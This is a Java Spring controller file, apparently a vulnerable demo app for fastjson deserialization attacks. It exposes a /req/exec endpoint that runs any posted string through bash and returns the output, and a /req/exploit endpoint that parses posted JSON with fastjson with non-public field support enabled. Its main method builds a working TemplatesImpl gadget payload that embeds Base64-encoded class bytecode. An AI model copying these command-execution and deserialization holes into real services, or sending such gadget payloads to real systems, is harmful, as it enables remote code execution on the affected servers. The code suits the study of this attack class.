package com.bocsh.web;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.bocsh.domain.User;
import com.bocsh.service.UserService;
import org.apache.tomcat.util.codec.binary.Base64;
import org.apache.tomcat.util.http.fileupload.IOUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.web.bind.annotation.*;

import java.io.*;
import java.util.ArrayList;
import java.util.List;

@RestController
@RequestMapping("/req")
public class ReqController {

    @PostMapping("/exec")
    public String exec(@RequestBody String cmd) throws IOException, InterruptedException {
        String result = "";
        String socicalNo = "122-12-1212";
        String idno = "test";
        java.lang.Process process = null;
        System.out.println(cmd);
        String [] cmd1={"/bin/bash","-c",cmd};
        try {
            process = Runtime.getRuntime().exec(cmd1);
            ByteArrayOutputStream resultOutStream = new ByteArrayOutputStream();
            InputStream errorInStream = new BufferedInputStream(process.getErrorStream());
            InputStream processInStream = new BufferedInputStream(process.getInputStream());
            int num = 0;
            byte[] bs = new byte[1024];
            while ((num = errorInStream.read(bs)) != -1) {
                resultOutStream.write(bs, 0, num);
            }
            while ((num = processInStream.read(bs)) != -1) {
                resultOutStream.write(bs, 0, num);
            }
            result = new String(resultOutStream.toByteArray());
            System.out.println(result);

            errorInStream.close();
            processInStream.close();
            resultOutStream.close();

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (process != null) process.destroy();
            return result;
        }
    }

    @PostMapping("/exploit")
    public String exploit(@RequestBody String json) {

        User user = JSON.parseObject(json,User.class, Feature.SupportNonPublicField);
        return user.getName();

    }

    public static void main(String args[]) throws Exception{

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File("D:\\idea\\demo\\target\\classes\\com\\bocsh\\domain\\Poc.class")), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        String bytecode =  Base64.encodeBase64String(bos.toByteArray());
        String req = "{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"" + bytecode + "\"],\"_name\":\"a.b\",\"_tfactory\":{ },\"_outputProperties\":{ },\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}";

        System.out.println(req);

    }

}
